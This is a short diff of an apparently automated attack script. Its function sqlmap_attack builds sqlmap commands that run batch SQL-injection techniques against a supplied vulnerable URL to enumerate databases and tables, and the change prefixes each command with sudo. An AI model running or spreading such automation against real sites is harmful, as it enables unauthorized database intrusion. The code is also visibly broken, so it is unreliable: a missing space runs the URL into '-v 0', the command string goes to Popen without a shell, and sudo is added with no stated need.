@@ -144,8 +144,8 @@ def sqlmap_attack(vul_info,num):
     sqlmap_path = "/home/runner/work/test-action/test-action/sqlmapproject-sqlmap-dcf304c/sqlmap.py"
     print("getcwd>>>>>>>>>>>>>>"+os.getcwd())
     #sqlmap_path = r"C:\fxh\tool\sqlmap\sqlmap.py"
-    cmd = "python "+sqlmap_path+" -u " +'"'+vul_url+'"' + "-v 0 --random-agent --technique=BEUSQ --batch -o --dbs"
-    cmd2 = "python "+sqlmap_path+" -u " +'"'+vul_url+'"' + "-v 0 --random-agent --technique=BEUSQ --batch -o --tables"
+    cmd = "sudo python "+sqlmap_path+" -u " +'"'+vul_url+'"' + "-v 0 --random-agent --technique=BEUSQ --batch -o --dbs"
+    cmd2 = "sudo python "+sqlmap_path+" -u " +'"'+vul_url+'"' + "-v 0 --random-agent --technique=BEUSQ --batch -o --tables"
     print(cmd)
     try:
         process = subprocess.Popen(cmd,stdout=subprocess.PIPE)
